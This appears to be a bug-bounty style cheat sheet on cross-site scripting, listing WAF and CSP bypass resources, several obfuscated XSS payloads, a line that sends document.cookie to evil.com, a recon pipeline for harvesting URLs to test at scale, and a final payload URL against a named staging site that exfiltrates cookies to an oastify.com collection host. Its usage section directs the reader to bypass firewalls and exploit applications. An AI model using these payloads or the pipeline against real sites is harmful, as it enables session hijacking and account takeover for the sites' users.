
---

### **XSS (Cross-Site Scripting) Resources**

#### **1. WAF Bypass & XSS Cheat Sheets**
- **Awesome WAF**:
  ```bash
  https://github.com/0xInfection/Awesome-WAF
  ```
- **Ghetto Bypass**:
  ```bash
  https://d3adend.org/xss/ghettoBypass
  ```
- **Browser's XSS Filter Bypass Cheat Sheet**:
  ```bash
  https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
  ```
- **Angular Bypass**:
  ```bash
  https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#angularの利用
  ```

#### **2. XSS Techniques**
- **Bypass Cookies blocked**
  ```bash
  </title><svg/onload="az3m=%27alert(document.co%27; az3m1=%27okie)%27;Az3mEasilyBypassXSS=az3m.concat(az3m1);eval(Az3mEasilyBypassXSS);">
  ```
- **HTTP Only Bypass**:
  ```bash
  location.href = "evil.com?c='escape(document.cookie)'"
  ```
- **Meta Refresh**:
  ```bash
  <meta http-equiv="refresh" content="0; url=http://example.com/">
  ```
- **Method Spoofing**:
  ```bash
  POST /endpoint
  Host: example.com
  _method=POST&data[user][username]=xsspayload
  ```
- **SameSite Bypass**:
  ```bash
  https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/
  ```
- **Script Source Bypass**:
  ```bash
  <script src=//14.rs>
  <script src=//ł.rip>
  ```
- **XSS Payload**:
  ```bash
  "><img/src='x'/onerror="parent['ale'+'rt'](parent['doc'+'ument']['cookie']);">
  ```
- **Using `eval`**:
  ```bash
  Use eval, but always make sure where to use + and where to use %2b.
  ```

#### **3. CSP (Content Security Policy)**
- **CSP Bypass**:
  ```bash
  https://www.notion.so/CSP-10615e0fe55e8064a661dcfb7c0ee992?pvs=21
  https://cspbypass.com/
  ```

#### **4. Additional Resources**
- **Medium Articles**:
  ```bash
  https://medium.com/@DrakenKun/how-i-was-able-to-find-4-cross-site-scripting-xss-on-vulnerability-disclosure-program-e2f39199ae16
  ```
- **Twitter Threads**:
  ```bash
  https://twitter.com/Botami143/status/1741363525568823385?t=Mh-SqOmunyxQyK7UhoQASQ&s=19
  ```
- **Hahwul's XSS Guide**:
  ```bash
  https://www.hahwul.com/cullinan/xss/?fbclid=IwAR1HX06q3yYwG73REvITzA7mshM0egPaGR0PzqbnzW25HE1h4XdPVrA1ZNY
  ```
- **WAF Bypass XSS Payloads**:
  ```bash
  https://github.com/gprime31/WAF-bypass-xss-payloads/tree/master?fbclid=IwAR3oBisE0veAu87f77xZVubYTTLa7k0bWKo7HTMprPgxfqm_-P2hKDAu2do
  ```
- **OWASP XSS Filter Evasion Cheat Sheet**:
  ```bash
  https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
  ```
- **Zapstiko's XSS Payloads**:
  ```bash
  https://github.com/zapstiko/wordlists/blob/main/xss_payloads
  ```

#### **5. Advanced XSS Payloads**
- **Details Tag Exploit**:
  ```bash
  <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
  ```

---

### **How to Use This Information**
1. **WAF Bypass**:
   - Use the provided cheat sheets and payloads to bypass Web Application Firewalls (WAFs).

2. **XSS Techniques**:
   - Experiment with different XSS payloads and techniques to find vulnerabilities in web applications.

3. **CSP Bypass**:
   - Study CSP bypass techniques to understand how to exploit Content Security Policy misconfigurations.

4. **Additional Resources**:
   - Refer to the provided links for more in-depth guides and examples of XSS exploitation.

---

```bash
Find subdomains.
subfinder -d domain -all | httpx -o subs1
subdominator -d domain  | httpx -o subs2

Merge all subs in one file
cat sub1 subs2|anew subs

Find history.
cat subs | wayback |anew xss-wayback
katana -list subs -o xss-katana
cat subs | gau --subs -o xss-gau

Sort all history in one file.
cat xss-wayback xss-katana xss-gau |anew xss.txt

Delete unnecessary extensions.
cat xss.txt |sort -u | grep "=" | egrep -iv ".(css|woff|woff2|txt|js|m4r|m4p|m4b|ipa|asa|pkg|crash|asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|webp|json|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|webm|mpp|_otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|_ttf|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)" | uro | httpx | anew xss

Run knoxnl against xss with both GET,POST methods.
knoxnl -i xss -X BOTH -s -o xssoutput.txt
```

```
https://app.staging.makeswift.com/login?next=javascript%3Afetch(%27https%3A%2F%2Flrg1wp93ejpjd16ko0rfja8zqqwhk88x.oastify.com%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent(document.cookie))
![image](https://github.com/user-attachments/assets/d9588aa4-44c3-4ae6-ae9c-07731ae84d9d)

```
